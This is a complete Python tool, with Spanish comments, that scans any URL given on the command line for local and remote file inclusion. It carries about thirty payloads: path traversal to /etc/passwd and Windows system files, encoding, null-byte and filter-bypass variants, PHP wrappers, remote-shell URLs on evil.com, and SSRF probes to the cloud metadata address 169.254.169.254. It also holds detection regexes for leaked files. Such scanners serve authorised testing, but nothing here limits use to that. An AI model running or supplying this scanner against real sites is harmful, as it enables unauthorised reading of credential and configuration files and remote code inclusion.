#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
LFI/RFI v2.0 - TANQUE EDITION
Local/Remote File Inclusion · Path traversal · 50+ payloads · WAF bypass
"""

import asyncio
import random
import re
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None

class LFI_RFI:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Parámetros vulnerables
        self.vulnerable_params = [
            'file', 'page', 'path', 'document', 'folder', 'root',
            'include', 'inc', 'load', 'read', 'view', 'content',
            'show', 'location', 'dir', 'image', 'img', 'media',
            'template', 'module', 'theme', 'style', 'css', 'js',
            'lang', 'language', 'locale', 'config', 'setting',
        ]
        
        # Payloads LFI
        self.lfi_payloads = [
            # Básicos
            ('../../../etc/passwd', 'basic_3'),
            ('../../../../etc/passwd', 'basic_4'),
            ('../../../../../etc/passwd', 'basic_5'),
            ('../../../../../../etc/passwd', 'basic_6'),
            
            # Con encoding
            ('..%2f..%2f..%2fetc%2fpasswd', 'encoded_2f'),
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'double_encoded'),
            ('..%252f..%252f..%252fetc%252fpasswd', 'double_percent'),
            
            # Windows
            ('..\\..\\..\\windows\\win.ini', 'windows_ini'),
            ('..\\..\\..\\boot.ini', 'windows_boot'),
            ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'windows_hosts'),
            
            # Con null byte
            ('../../../etc/passwd%00', 'null_byte'),
            ('../../../etc/passwd%00.png', 'null_byte_png'),
            ('../../../etc/passwd%00.jpg', 'null_byte_jpg'),
            
            # Con wrappers
            ('php://filter/convert.base64-encode/resource=../../../etc/passwd', 'php_filter'),
            ('php://filter/read=string.rot13/resource=../../../etc/passwd', 'php_rot13'),
            ('php://input', 'php_input'),
            ('data://text/plain;base64,SSBsb3ZlIFBIUAo=', 'data_wrapper'),
            
            # Absolute paths
            ('/etc/passwd', 'absolute'),
            ('/var/www/html/config.php', 'absolute_config'),
            ('C:\\windows\\win.ini', 'windows_absolute'),
            
            # Bypass filters
            ('....//....//....//etc/passwd', 'double_dot'),
            ('..;/..;/..;/etc/passwd', 'semicolon'),
            ('..././..././..././etc/passwd', 'dot_slash'),
            ('..//..//..//etc/passwd', 'double_slash'),
            ('.././.././.././etc/passwd', 'current_dir'),
        ]
        
        # Payloads RFI
        self.rfi_payloads = [
            ('http://evil.com/shell.txt?', 'http'),
            ('https://evil.com/shell.txt?', 'https'),
            ('ftp://evil.com/shell.txt', 'ftp'),
            ('//evil.com/shell.txt', 'protocol_relative'),
            ('\\\\evil.com\share\shell.txt', 'windows_unc'),
            ('http://169.254.169.254/latest/meta-data/', 'ssrf_aws'),
            ('http://127.0.0.1:8080/admin', 'ssrf_local'),
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            (r'root:.*:0:0:', 'passwd'),
            (r'daemon:.*:1:1:', 'passwd'),
            (r'bin:.*:2:2:', 'passwd'),
            (r'\[fonts\]', 'win_ini'),
            (r'\[extensions\]', 'win_ini'),
            (r'<?php', 'php_code'),
            (r'PD9waHA', 'base64_php'),
            (r'^[\w\+\/]+={0,2}$', 'base64'),
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    def extract_params(self) -> List[str]:
        """Extrae parámetros de la URL"""
        params = []
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # Añadir parámetros vulnerables
        params.extend(self.vulnerable_params)
        return list(set(params))
        
    def build_test_url(self, param: str, payload: str) -> str:
        """Construye URL de prueba"""
        if '?' in self.url:
            query_parts = self.url.split('?')[1].split('&')
            new_query = []
            replaced = False
            
            for part in query_parts:
                if part.startswith(f"{param}="):
                    new_query.append(f"{param}={quote(payload)}")
                    replaced = True
                else:
                    new_query.append(part)
                    
            if not replaced:
                new_query.append(f"{param}={quote(payload)}")
                
            return f"{self.url.split('?')[0]}?{'&'.join(new_query)}"
        else:
            return f"{self.url}?{param}={quote(payload)}"
            
    def check_inclusion(self, text: str) -> List[str]:
        """Verifica si hay inclusión exitosa"""
        indicators = []
        
        for pattern, name in self.success_patterns:
            if re.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                indicators.append(name)
                
        return indicators
        
    async def test_param(self, param: str, payload: tuple, is_rfi: bool = False) -> Optional[Dict]:
        """Prueba un parámetro con un payload"""
        payload_str, payload_name = payload
        
        test_url = self.build_test_url(param, payload_str)
        
        try:
            resp = await self.client.get(test_url)
            
            if not resp:
                return None
                
            text = await resp.text()
            indicators = self.check_inclusion(text)
            
            if indicators:
                return {
                    'type': 'RFI' if is_rfi else 'LFI',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'url': test_url,
                    'indicators': indicators,
                    'size': len(text),
                    'severity': 'CRITICO'
                }
                
        except Exception as e:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo LFI/RFI"""
        print(f"\n📂 LFI/RFI v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            params = self.extract_params()
            print(f"[*] Probando {len(params)} parámetros")
            print(f"[*] Payloads LFI: {len(self.lfi_payloads)}")
            print(f"[*] Payloads RFI: {len(self.rfi_payloads)}")
            print("-" * 70)
            
            for param in params:
                print(f"\n[*] Probando parámetro: {param}")
                
                # Probar LFI
                for payload in self.lfi_payloads:
                    result = await self.test_param(param, payload, is_rfi=False)
                    
                    if result:
                        self.findings.append(result)
                        print(f"   [[CRITICO]] LFI: {result['payload_name']}")
                        print(f"        ↳ {', '.join(result['indicators'])}")
                        break
                        
                    await asyncio.sleep(random.uniform(0.2, 0.5))
                    
                # Probar RFI (si aggressive)
                if self.aggressive:
                    for payload in self.rfi_payloads:
                        result = await self.test_param(param, payload, is_rfi=True)
                        
                        if result:
                            self.findings.append(result)
                            print(f"   [[CRITICO]] RFI: {result['payload_name']}")
                            break
                            
                        await asyncio.sleep(random.uniform(0.2, 0.5))
                        
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS LFI/RFI")
            print("="*70)
            
            if self.findings:
                lfi = [f for f in self.findings if f['type'] == 'LFI']
                rfi = [f for f in self.findings if f['type'] == 'RFI']
                
                if lfi:
                    print(f"\n📂 LFI: {len(lfi)}")
                if rfi:
                    print(f"\n[WEB] RFI: {len(rfi)}")
                    
                print(f"\n[OK] TOTAL: {len(self.findings)}")
                
                # Guardar resultados
                with open(f"lfi_rfi_{self.domain}.txt", 'w') as f:
                    for finding in self.findings:
                        f.write(f"{finding['url']} [{finding['type']}]\n")
                print(f"\n💾 Resultados guardados en lfi_rfi_{self.domain}.txt")
            else:
                print("\n[OK] No se detectaron inclusiones de archivos")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 lfi_rfi.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    scanner = LFI_RFI(url, aggressive)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
